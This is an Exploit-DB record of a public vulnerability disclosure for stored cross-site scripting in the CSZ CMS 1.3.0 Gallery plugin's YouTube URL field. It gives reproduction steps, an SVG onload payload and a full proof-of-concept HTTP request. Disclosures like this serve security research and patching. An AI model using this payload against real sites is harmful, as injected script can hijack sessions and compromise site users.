{"source": "https://www.exploit-db.com/exploits/51704", "vulnName": "CSZ CMS 1.3.0 - Stored Cross-Site Scripting (Plugin 'Gallery')", "vulnEDBID": "51704", "vulnCVE": "N/A", "author": "DANIEL GONZ\u00c1LEZ", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2023-09-04", "vulnContent": "# Exploit Title: CSZ CMS 1.3.0 - Stored Cross-Site Scripting (Plugin 'Gallery')\n# Date: 2023/08/18\n# CVE: CVE-2023-38911\n# Exploit Author: Daniel Gonz\u00e1lez\n# Vendor Homepage: https://www.cszcms.com/\n# Software Link: https://github.com/cskaza/cszcms\n# Version: 1.3.0\n# Tested on: CSZ CMS 1.3.0\n# Description:\n# CSZ CMS 1.3.0 is affected by a cross-site scripting (XSS) feature that allows attackers to execute arbitrary web scripts or HTML via a crafted payload entered in the 'Gallery' section and choosing our Gallery. previously created, in the 'YouTube URL' field, this input is affected by an XSS. It should be noted that previously when creating a gallery the \"Name\" field was vulnerable to XSS, but this was resolved in the current version 1.3.0, the vulnerability found affects the \"YouTube URL\" field within the created gallery.\n\n# Steps to reproduce Stored XSS:\n\nGo to url http://localhost/admin/plugin/gallery/edit/2.\n\nWhen logging into the panel, we will go to the \"Gallery\" section and create a Carousel [http://localhost/admin/plugin/gallery], the vulnerable field is located at [http://localhost/admin/plugin/gallery/edit/2]\nWe edit that Gallery that we have created and see that we can inject arbitrary web scripts or HTML into the \u201cYoutube URL\u201dfields.\n\nWith the following payload we can achieve the XSS\n\nPayload:\n\n<div><p title=\"</div><svg/onload=alert(document.domain)>\">\n\n\n#PoC Request:\n\nPOST http://localhost:8080/admin/plugin/gallery/addYoutube/2 HTTP/1.1\nHost: localhost:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/116.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 140\nOrigin: http://localhost:8080\nReferer: http://localhost:8080/admin/plugin/gallery/edit/2\nUpgrade-Insecure-Requests: 1\n\ngallery_type=youtubevideos&youtube_url=%3Cdiv%3E%3Cp+title%3D%22%3C%2Fdiv%3E%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%3E&submit=Add\n            "}